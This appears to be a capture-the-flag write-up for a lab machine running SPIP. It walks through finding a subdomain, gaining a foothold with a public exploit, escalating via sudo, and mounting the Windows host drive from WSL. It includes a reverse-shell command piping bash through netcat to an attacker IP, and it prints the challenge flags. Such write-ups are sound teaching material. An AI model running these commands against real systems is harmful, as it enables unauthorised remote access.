### Challenge Description

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/7994f474-c11f-492b-a928-6e2e19898496)

## Enumeration

The main page seems pretty static with nothing of interest on it, with the exception of this link:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/0f777b2d-9d28-49fe-80e7-f0ec0d043838)

Which hides a subdomain that we didn't find by fuzzing `spip.submerged.htb`:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/f8781b29-34dd-4d12-a72f-ec928459d827)

## Foothold

Searching around, we find [this](https://www.exploit-db.com/exploits/51536) public exploit for this app. After we run it, we get a foothold:  

```bash
python3 spipexploit.py -u http://spip.submerged.htb -c 'busybox nc 10.10.14.34 3000 -e bash'
```

We are user `matthew`:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/01d3d98d-1ca9-4dbf-8324-faf8a84e2e7c)

And get the user flag:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/25956e8e-aae5-441e-995b-4d7d70b2680f)

`HTB{SpIP_Abu53_4_RC3}`

A keen eye would observe that matthew is in the sudo group and sure enough, a quick `sudo bash` drops us into a root shell. We have root but no root flag.

## Privesc

Given the hostname, linpeas output and the fact that there is an empty folder in /mnt/c .. it is easy to conclude that this is actually a [WSL](https://learn.microsoft.com/en-us/windows/wsl/) filesystem.

Armed with this knowledge, we can try to mount the C:\ drive of the underlying host OS:  

```bash
mount -t drvfs C: /mnt/c
```

`drvfs` stands for "Driver File System" which is a file system type used by the Windows Subsystem for Linux (WSL).

Now we actually have content in our mount:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/9d124c3c-27df-4600-9af5-1d2cabe0a9ab)

We can also navigate to the administrator desktop folder and get the root flag:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/eebd43b2-3e92-42ee-a604-0233dbf24b0f)

`HTB{Pwn1ng_WsL_4_7h3_W1n}`


